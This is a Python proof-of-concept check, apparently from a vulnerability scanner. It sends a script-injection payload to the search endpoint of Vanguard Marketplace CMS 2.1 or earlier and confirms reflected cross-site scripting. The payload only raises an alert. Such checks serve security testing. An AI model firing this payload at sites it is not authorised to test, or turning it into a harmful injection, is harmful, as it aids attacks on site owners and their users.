import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Vanguard Marketplace CMS ≤ 2.1''',
        "description": '''Persistent Cross-site Scripting in message & product title-tags also there's Non-Persistent Cross-site scripting in product search box''',
        "severity": "medium",
        "references": [
            "https://packetstormsecurity.com/files/157099/Vanguard-2.1-Cross-Site-Scripting.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["vanguard", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/search"""
        method = "POST"
        data = """phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""</script><script>alert(document.domain)</script>""" in resp0.text) and ("""text/html""" in str(resp0.headers)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url